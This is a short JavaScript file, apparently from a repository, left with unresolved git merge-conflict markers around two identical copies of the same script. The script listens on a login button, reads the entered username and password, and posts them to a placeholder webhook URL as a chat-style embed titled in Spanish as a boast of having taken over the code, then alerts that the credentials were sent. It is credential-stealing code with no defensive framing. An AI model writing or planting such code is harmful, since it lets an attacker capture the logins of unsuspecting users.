<<<<<<< HEAD
<script>
document.getElementById('login-btn').addEventListener('click', function() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const webhookURL = 'YOUR_WEBHOOK_URL';

    const payload = {
        embeds: [
            {
                title: "mi nombre es capitan hook y tome el control de este codigo",
                description: `**Username:** ${username}\n**Password:** ${password}`,
                color: 15158332 // This is a color code, you can use different colors
            }
        ]
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            alert('Credentials sent successfully!');
        } else {
            alert('Failed to send credentials.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error sending credentials.');
    });
});
=======
<script>
document.getElementById('login-btn').addEventListener('click', function() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const webhookURL = 'YOUR_WEBHOOK_URL';

    const payload = {
        embeds: [
            {
                title: "mi nombre es capitan hook y tome el control de este codigo",
                description: `**Username:** ${username}\n**Password:** ${password}`,
                color: 15158332 // This is a color code, you can use different colors
            }
        ]
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            alert('Credentials sent successfully!');
        } else {
            alert('Failed to send credentials.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error sending credentials.');
    });
});
>>>>>>> d36a2990586791c64f3639befd16a11c3c7651d7
</script>